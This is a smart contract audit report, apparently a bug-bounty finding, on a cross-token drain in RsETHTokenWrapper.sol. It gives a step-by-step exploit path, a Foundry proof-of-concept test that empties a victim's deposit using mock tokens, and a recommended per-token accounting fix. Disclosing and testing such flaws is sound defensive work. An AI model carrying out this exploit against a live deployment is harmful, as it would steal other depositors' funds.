Audit Report

## Title
Cross-Token Drain via Unlinked Deposit/Withdrawal Accounting - (File: contracts/L2/RsETHTokenWrapper.sol)

## Summary

`RsETHTokenWrapper` maintains no per-token accounting between deposits and withdrawals. Because `_deposit` mints `wrsETH` against any `allowedToken` and `_withdraw` redeems `wrsETH` for any `allowedToken` independently, once two tokens are simultaneously active in `allowedTokens`, any unprivileged user can deposit the lower-value token and withdraw the higher-value token at a 1:1 nominal ratio, directly stealing other depositors' collateral.

## Finding Description

`_deposit` (lines 134–141) accepts any `allowedToken`, pulls it from the caller, and mints `wrsETH` 1:1. `_withdraw` (lines 120–128) accepts any `allowedToken`, burns `wrsETH` 1:1, and transfers the requested token out. The sole guard in `_withdraw` is `allowedTokens[_asset]`; there is no record of which token backed any given `wrsETH` balance and no check that the redeemed token matches the deposited token.

The contract is explicitly designed to hold multiple tokens simultaneously: `reinitialize` (line 47, callable by `DEFAULT_ADMIN_ROLE`) adds a second altRsETH token to a live deployment, and `addAllowedToken` (line 174, callable by `TIMELOCK_ROLE`) can register further tokens. Once two tokens are active, the invariant "each unit of `wrsETH` is backed by the specific token that minted it" is broken at the contract level.

Exploit path:
1. `altRsETH1` and `altRsETH2` are both in `allowedTokens`; the wrapper holds 10,000 `altRsETH2` deposited by legitimate users.
2. Attacker calls `deposit(altRsETH1, 10_000)` → receives 10,000 `wrsETH`.
3. Attacker calls `withdraw(altRsETH2, 10_000)` → `allowedTokens[altRsETH2] == true` passes; 10,000 `wrsETH` burned; 10,000 `altRsETH2` transferred out.
4. Wrapper now holds 10,000 `altRsETH1` instead of `altRsETH2`; original `altRsETH2` depositors cannot recover their tokens.

No existing check prevents this. `maxAmountToDepositBridgerAsset` (lines 99–110) computes a per-asset balance check but is only used by the privileged `depositBridgerAssets` path, not by user-facing `deposit`/`withdraw`.

## Impact Explanation

**Critical — direct theft of user funds.** The attacker extracts the full price differential between the two tokens multiplied by the available balance of the more valuable token. The loss is permanent: the original depositors' `altRsETH2` is replaced by `altRsETH1` with no recourse. This matches the allowed impact class "Direct theft of any user funds, whether at-rest or in-motion."

## Likelihood Explanation

**Medium.** The precondition — two tokens simultaneously in `allowedTokens` — is an intentional protocol state reached via `reinitialize` or `addAllowedToken`, both of which are normal governance operations. The exploit itself requires no privileged access; any holder of `altRsETH1` can execute it atomically. Different bridge representations of the same underlying asset routinely trade at small but nonzero price differences, making the attack immediately profitable the moment a second token is registered.

## Recommendation

Introduce per-token accounting: maintain a `mapping(address => uint256) public tokenDeposits` that tracks how much of each token backs outstanding `wrsETH`. In `_deposit`, increment `tokenDeposits[_asset]`. In `_withdraw`, decrement `tokenDeposits[_asset]` and revert if the withdrawal would exceed the recorded balance for that token. Alternatively, restrict the wrapper to a single canonical token at any given time and require an explicit migration (burn old token supply, re-collateralize with new token) when switching.

## Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import "contracts/L2/RsETHTokenWrapper.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockToken is ERC20 {
    constructor(string memory name) ERC20(name, name) {
        _mint(msg.sender, 1_000_000e18);
    }
}

contract CrossTokenDrainTest is Test {
    RsETHTokenWrapper wrapper;
    MockToken altRsETH1;
    MockToken altRsETH2;
    address admin = address(0xA);
    address victim = address(0xB);
    address attacker = address(0xC);

    function setUp() public {
        altRsETH1 = new MockToken("altRsETH1");
        altRsETH2 = new MockToken("altRsETH2");

        wrapper = new RsETHTokenWrapper();
        // initialize with altRsETH1
        vm.prank(admin);
        wrapper.initialize(admin, address(0), address(altRsETH1));

        // admin adds altRsETH2 via reinitialize
        vm.prank(admin);
        wrapper.reinitialize(address(altRsETH2));

        // victim deposits 10_000 altRsETH2
        altRsETH2.transfer(victim, 10_000e18);
        vm.startPrank(victim);
        altRsETH2.approve(address(wrapper), 10_000e18);
        wrapper.deposit(address(altRsETH2), 10_000e18);
        vm.stopPrank();

        // attacker holds 10_000 altRsETH1 (cheaper token)
        altRsETH1.transfer(attacker, 10_000e18);
    }

    function testCrossTokenDrain() public {
        vm.startPrank(attacker);
        altRsETH1.approve(address(wrapper), 10_000e18);
        // deposit cheap token
        wrapper.deposit(address(altRsETH1), 10_000e18);
        // withdraw expensive token — succeeds with no revert
        wrapper.withdraw(address(altRsETH2), 10_000e18);
        vm.stopPrank();

        // attacker now holds altRsETH2 they never deposited
        assertEq(altRsETH2.balanceOf(attacker), 10_000e18);
        // victim's altRsETH2 is gone from the wrapper
        assertEq(altRsETH2.balanceOf(address(wrapper)), 0);
    }
}
```
